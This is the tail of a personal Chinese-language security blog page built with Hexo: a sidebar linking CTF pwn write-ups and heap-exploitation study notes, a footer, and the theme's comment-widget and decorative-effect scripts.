21:17:46">2021-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/13/%E3%80%90WP%E3%80%91CSTC2021-Pwn/" title="【WP】CSTC2021-Pwn"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】CSTC2021-Pwn"/></a><div class="content"><a class="title" href="/2021/05/13/%E3%80%90WP%E3%80%91CSTC2021-Pwn/" title="【WP】CSTC2021-Pwn">【WP】CSTC2021-Pwn</a><time datetime="2021-05-13T13:17:16.000Z" title="发表于 2021-05-13 21:17:16">2021-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/12/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/" title="how2heap学习笔记-3"><img src="https://ae01.alicdn.com/kf/U01d4ba5a6f0a460496eb5cc2ca9599b7E.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap学习笔记-3"/></a><div class="content"><a class="title" href="/2021/05/12/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3/" title="how2heap学习笔记-3">how2heap学习笔记-3</a><time datetime="2021-05-12T07:35:52.000Z" title="发表于 2021-05-12 15:35:52">2021-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/15/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/" title="how2heap学习笔记-2"><img src="https://ae01.alicdn.com/kf/U01d4ba5a6f0a460496eb5cc2ca9599b7E.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="how2heap学习笔记-2"/></a><div class="content"><a class="title" href="/2021/04/15/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/" title="how2heap学习笔记-2">how2heap学习笔记-2</a><time datetime="2021-04-15T09:05:47.000Z" title="发表于 2021-04-15 17:05:47">2021-04-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/04/14/%E3%80%90WP%E3%80%91hitcon2014-stkof/" title="【WP】hitcon2014_stkof"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】hitcon2014_stkof"/></a><div class="content"><a class="title" href="/2021/04/14/%E3%80%90WP%E3%80%91hitcon2014-stkof/" title="【WP】hitcon2014_stkof">【WP】hitcon2014_stkof</a><time datetime="2021-04-14T07:43:14.000Z" title="发表于 2021-04-14 15:43:14">2021-04-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By aYoung</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'L7cFgIQhurvmmSexryctex39-MdYXbMMI',
+      appKey: 'EG1BbRP3FTdnTfn0QeeeIDii',
+      placeholder: 'Please leave your footprints',
+      avatar: 'robohash',
+      meta: 'nick/mail/link'.split(','),
+      pageSize: '10',
+      avatar_cdn: 'https://www.gravatar.com/avatar/',
+      lang: 'zh-CN',
+      recordIP: true,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: true,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick/mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
